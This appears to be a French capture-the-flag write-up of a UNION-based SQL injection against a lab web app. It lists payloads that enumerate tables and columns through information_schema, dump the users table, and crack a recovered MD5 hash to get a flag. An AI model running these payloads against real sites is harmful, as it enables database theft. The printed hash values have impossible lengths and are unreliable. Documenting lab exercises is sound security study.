@@ -1,0 +1,68 @@
+Flag 8 - SQL Injection UNION
+
+On se rend à la page : http://192.168.1.47/?page=member
+
+Un champ "Search member by ID" permet de pouvoir tester des payloads.
+
+J'ai testé :
+
+1 OR 1=1
+
+Le serveur nous a envoyé plusieurs utilisateurs
+<img width="1202" height="763" alt="Image" src="https://github.com/user-attachments/assets/6ec5ac30-d473-459d-8cfa-9d94f4291df5" />
+
+On sait que la requête est vulnérable à l'injection SQL.
+
+On cherche les nom de colonnes :
+
+1 UNION SELECT NULL,NULL--
+<img width="1514" height="896" alt="Image" src="https://github.com/user-attachments/assets/6b722267-ec5d-46f3-a4e1-0064552ef5f6" />
+
+On sait que la requête possède deux colonnes.
+
+On cherche le nombre de table de la base :
+
+1 OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables--
+
+On trouve :
+
+    users
+    list_images
+    guestbook
+    vote_dbs
+
+On se focalise sur la table users, plus interessante.
+
+On cherche le nombre de colonne de la table users : 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns--
+
+On trouve :
+
+    user_id
+    first_name
+    last_name
+    town
+    country
+    planet
+    Commentaire
+    countersign
+    etc...
+
+On cherche les données de la table users :
+
+1 OR 1=1 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users--
+
+On trouve un hash :
+<img width="1424" height="659" alt="Image" src="https://github.com/user-attachments/assets/33b33839-348d-457a-a971-135cd44ac71b" />
+
+MD5 = 5ff9d0165b4f92b14994e5c685cdce028
+
+On le déchiffre :
+<img width="1047" height="503" alt="Image" src="https://github.com/user-attachments/assets/902a5743-455b-43c2-ad7f-129dac4028e9" />
+Enfin pour hasher "fortytwo" en SHA256, on utilise :
+
+echo -n "fortytwo" | sha256sum
+
+Ce qui nous donne le flag :
+
+10a16d834f9b1e4068b25c4c46fe284e99e44dceaf08098fc83925ba6311ff5
+<img width="607" height="46" alt="Image" src="https://github.com/user-attachments/assets/0a203214-a705-4c2a-8ea8-3e940c29ccb9" />
